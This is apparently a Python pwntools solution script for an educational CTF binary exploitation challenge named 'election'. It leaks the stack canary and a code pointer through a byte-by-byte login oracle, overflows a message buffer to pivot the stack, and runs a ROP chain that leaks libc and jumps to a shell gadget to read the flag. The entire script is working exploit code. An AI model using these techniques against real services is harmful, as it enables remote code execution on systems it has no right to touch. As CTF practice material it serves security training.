from pwn import *

context.arch = "amd64"
#context.log_level = "DEBUG"

elf = ELF('./election')
#r = process('./election')
r = remote('edu-ctf.csie.org', 10180)

def voteonetime(who):
	r.sendafter('>','1')
	r.sendafter('[0~9]',who)

def flood(myname,who):
	r.sendafter('>','1')
	r.sendafter('Token:',myname)
	voteonetime(who)
	voteonetime(who)
	voteonetime(who)
	voteonetime(who)
	voteonetime(who)
	r.sendafter('>','3')

def register(myname):
	r.sendafter('>','2')
	r.sendafter('token:',myname)

def regnflood(name,who):
	register(name)
	flood(name,who)

def guan256():
	for i in range(17):
		regnflood('13','9')
		regnflood('23','9')
		regnflood('30','9')

def register(myname):
	r.sendafter('>','2')
	r.sendafter('token:',myname)


def login(myname):
	r.sendafter('>','1')
	r.sendafter('Token:',myname)
	
def logout():	
	r.sendafter('>','3')
	
# bruteforce login oracle XDDD
register('A'*0xb8)
init_str = 'A'*0xb8
for i in range(16):
	for ch in range(256):
		login(init_str+chr(ch))
		res = r.recvline()
		print res[1:8]
		
		if res[1:8] != 'Invalid':
			init_str = init_str+chr(ch)
			logout()
			break
		
# calculate base and add offsets to get our gadgets
canary = u64(init_str[-16:-8])
oldebp = u64(init_str[-8:])

buf = elf.symbols['buf']
csu_init_off = 0x1140
leaveret_off = 0xbe9
code_base = oldebp - csu_init_off
leavegad = code_base+leaveret_off
puts_plt = code_base + elf.plt['puts']
printf_got = code_base + elf.got['printf']
pop_rdi = code_base + 0x11a3
main = code_base + 0xc67
csu_down = code_base + 0x119a
csu_up = code_base + 0x1180
prsp_ret = code_base + 0x119d
ret = code_base + 0x906

# new writable gadget, 0x100 bytes after buf
new_gadget = code_base + buf + 0x100

# get 256 votes to send 256 bytes message and overflow to do stack pivoting
guan256()
# ROP chain --> has to leak libc + read new input into new gadget + jump over to new gadget
gadgetload = p64(oldebp) + p64(pop_rdi) + p64(printf_got) + p64(puts_plt) + p64(csu_down) + p64(0) + p64(1) + p64(code_base + elf.got['read']) + p64(0x0) + p64(new_gadget) + p64(0x50) + p64(csu_up) + "\x00"*56 + p64(prsp_ret) + p64(new_gadget-0x18)
register(gadgetload)
login(gadgetload)
r.sendafter('>','2')
r.sendafter('[0~9]:','9')
success( 'canary -> %s'%hex(canary))
success( 'oldebp -> %s'%hex(oldebp))
success('buf :%s'%hex(buf))
success('base :%s'%hex(code_base))
payload = 'A'*0xe8 + p64(canary) + p64(buf+code_base) + p64(leavegad)
r.sendafter('Message: ', payload)
r.sendafter('>','3')#logout
r.recvuntil('>')
r.recvline()
printf_libc = u64(r.recvline()[:6]+'\0\0')
success('printflibc -> %s'%hex(printf_libc))
libc_base = printf_libc - 0x64e80
system_libc = printf_libc-0x64e80+0x4f440
pause()
#lastpayload = p64(pop_rdi) + p64(libccc.search('/bin/sh').next()+libc_base) + p64(ret) + p64(system_libc)
lastpayload = p64(libc_base+0x4f322)
r.sendline(lastpayload)
r.sendline('cat /home/election/flag')
r.interactive()
